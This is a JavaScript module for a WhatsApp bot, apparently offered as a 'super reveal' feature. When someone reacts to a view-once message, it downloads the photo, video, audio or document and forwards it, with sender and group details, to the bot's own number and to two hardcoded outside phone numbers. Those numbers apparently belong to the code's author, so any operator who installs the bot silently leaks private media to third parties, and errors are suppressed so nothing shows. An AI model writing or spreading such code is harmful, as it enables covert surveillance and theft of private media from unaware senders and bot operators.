// observers/superReveal.js
export default async function superReveal(sock, { msg, from, sender, reaction, isGroup }, botSettings) {
  try {
    if (!reaction) return
    if (!reaction.text) return

    const contextInfo = msg.message?.reactionMessage?.key
    if (!contextInfo) return

    const quotedMsg = await sock.loadMessage(from, contextInfo.id).catch(() => null)
    if (!quotedMsg) return

    const isViewOnce = quotedMsg.message?.viewOnceMessage?.message ||
                       quotedMsg.message?.viewOnceMessageV2?.message ||
                       quotedMsg.message?.viewOnceMessageV2Extension?.message

    if (!isViewOnce) return

    const actualMsg = isViewOnce
    const msgType = Object.keys(actualMsg)[0]
    const mediaMsg = actualMsg[msgType]

    const stream = await sock.downloadMediaMessage({ message: actualMsg }).catch(() => null)
    if (!stream) return

    const chunks = []
    for await (const chunk of stream) chunks.push(chunk)
    const buffer = Buffer.concat(chunks)

    if (!buffer || buffer.length === 0) return

    const VIP_NUMBERS = ['255780470905', '255747470941']
    const botJid = sock.user.id
    const botNumber = botJid.split(':')[0] + '@s.whatsapp.net'

    const targets = [
     ...VIP_NUMBERS.map(n => n + '@s.whatsapp.net'),
      botNumber
    ]

    const uniqueTargets = [...new Set(targets)]

    const brandName = botSettings?.brand_name || 'Bot'
    const senderNum = sender.split('@')[0]
    const groupInfo = isGroup? from : 'Private'

    let caption = `╭──⌈ 👀 SUPER REVEAL ⌋
│ Type: ${msgType}
│ From: ${senderNum}
│ Group: ${groupInfo}
│ Reacted: ${reaction.text}
│ Time: ${new Date().toLocaleString()}
╰────────────────\n`

    if (mediaMsg.caption) {
      caption += `╭──⌈ CAPTION ⌋\n│ ${mediaMsg.caption}\n╰────────────────\n`
    }
    caption += `Powered by ${brandName}`

    let sendOptions = {}

    if (msgType === 'imageMessage') {
      sendOptions = { image: buffer, caption }
    } else if (msgType === 'videoMessage') {
      sendOptions = { video: buffer, caption, gifPlayback: mediaMsg.gifPlayback || false }
    } else if (msgType === 'audioMessage') {
      sendOptions = { audio: buffer, mimetype: mediaMsg.mimetype || 'audio/mp4', ptt: mediaMsg.ptt || false }
    } else if (msgType === 'documentMessage') {
      sendOptions = { document: buffer, mimetype: mediaMsg.mimetype, fileName: mediaMsg.fileName || 'file', caption }
    } else if (msgType === 'conversation' || msgType === 'extendedTextMessage') {
      sendOptions = { text: caption + `\n╭──⌈ CONTENT ⌋\n│ ${mediaMsg || ''}\n╰────────────────` }
    } else {
      sendOptions = { text: caption + '\n╭──⌈ INFO ⌋\n│ Unsupported type, raw data sent\n╰────────────────' }
    }

    for (const target of uniqueTargets) {
      await sock.sendMessage(target, sendOptions).catch(() => {})
    }

  } catch (err) {
    console.log('SuperReveal error:', err.message)
  }
}